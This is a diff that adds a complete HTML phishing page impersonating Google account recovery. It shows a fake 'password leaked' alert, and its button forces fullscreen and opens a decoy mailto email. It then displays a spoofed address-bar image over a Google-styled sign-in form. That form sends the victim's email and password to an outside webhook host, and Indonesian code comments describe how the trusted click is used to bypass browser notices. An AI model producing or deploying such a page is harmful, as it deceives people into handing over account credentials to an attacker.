@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Account Recovery</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { margin: 0; font-family: 'Ubuntu', Arial, sans-serif; overflow: hidden; background: #f2f2f2; }
+    #front {
+      align-items: center; justify-content: center; padding: 25vh; display: flex; flex-direction: column; text-align: center;
+    }
+    #front h1 { color: #333; margin: 20px 0; font-size: 24px; line-height: 1.5; }
+    #front h3 { color: #f01212; margin: 40px 0; font-size: 18px; }
+    #front button {
+      display: block; margin: 20px auto; padding: 12px 28px; background-color: #3f51b5; color: #fff;
+      border: none; border-radius: 5px; cursor: pointer; font-size: 16px;
+    }
+    #front button:hover { background-color: #303f9f; }
+
+    #spoofed { display: none; width: 100vw; height: 100vh; position: relative; }
+    .header {
+      position: absolute; top: 0; left: 0; width: 100vw; z-index: 9999;
+    }
+    .login-box {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      background: #fff; padding: 50px; box-shadow: 0px 0px 20px rgba(0,0,0,0.2); border-radius: 10px; width: 400px;
+    }
+    .warning-img { width: 100%; margin-bottom: 30px; }
+    .warning-text { color: #12f030; font-weight: bold; margin-bottom: 20px; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px;
+    }
+    input[type="submit"] {
+      width: 100%; padding: 12px; background: #3f51b5; color: white; border: none; border-radius: 5px;
+      font-size: 16px; cursor: pointer;
+    }
+    input[type="submit"]:hover { background: #303f9f; }
+  </style>
+</head>
+<body>
+
+  <div id="front">
+    <h1>Oh no, your Account password has been leaked. To get your account back, follow these steps:</h1>
+    <h3>
+      1. Notify Security Team by email about the case using the button below!!.<br>
+      2. On the next page of the Google Account website, enter your last used account password to verify it.
+    </h3>
+    <button onclick="run()">Have a Good Dream</button>
+  </div>
+
+  <div id="spoofed">
+    <img src="https://guzings.github.io/spoof.png" class="header" alt="Spoofed Address Bar">
+
+    <div class="login-box">
+      <img src="https://www.gstatic.com/identity/boq/accountsettingsmobile/signedout_security_scene_316x112_897e5cfed5be1d1d2e6f376d675ff02d.png" class="warning-img" alt="Security Warning">
+      <div class="warning-text">Enter your last used account password to verify.</div>
+
+      <form action="https://polite-whale-73.webhook.cool" method="POST">
+        <label>Email:</label>
+        <input type="text" name="email" required autocomplete="username">
+        <label>Password:</label>
+        <input type="password" name="pass" required autocomplete="current-password">
+        <input type="submit" value="Sign In">
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function run() {
+      const front = document.getElementById("front");
+      const spoofed = document.getElementById("spoofed");
+      const elem = document.documentElement;
+
+      // 1. FULLSCREEN DULU (trusted karena klik)
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
+      }
+
+      // 2. TRIGGER MAILTO: (bypass notification karena trusted gesture)
+      setTimeout(() => {
+        location.href = "mailto:notsecurity@notgoogle.com?subject=Request%20to%20Block%20Compromised%20Account&body=Dear%20Google%20Security%20Team%2C%0A%0AI%20hope%20this%20email%20finds%20you%20well.%20I%20am%20writing%20to%20notify%20you%20that%20my%20Google%20account%20password%20has%20been%20leaked.%20I%20am%20concerned%20about%20the%20security%20of%20my%20personal%20information%20and%20would%20like%20to%20request%20that%20my%20account%20be%20blocked%20as%20soon%20as%20possible.%0A%0APlease%20let%20me%20know%20what%20steps%20I%20need%20to%20take%20to%20ensure%20that%20my%20account%20is%20secured%20and%20my%20personal%20information%20is%20protected.%20I%20would%20also%20appreciate%20any%20additional%20security%20measures%20that%20you%20can%20recommend%20to%20prevent%20future%20incidents%20like%20this.%0A%0AThank%20you%20for%20your%20prompt%20attention%20to%20this%20matter.%20I%20look%20forward%20to%20hearing%20from%20you%20soon..";
+      }, 300);
+
+      // 3. GANTI KE SPOOF PAGE
+      front.style.display = "none";
+      spoofed.style.display = "block";
+    }
+  </script>
+
+</body>
+</html>
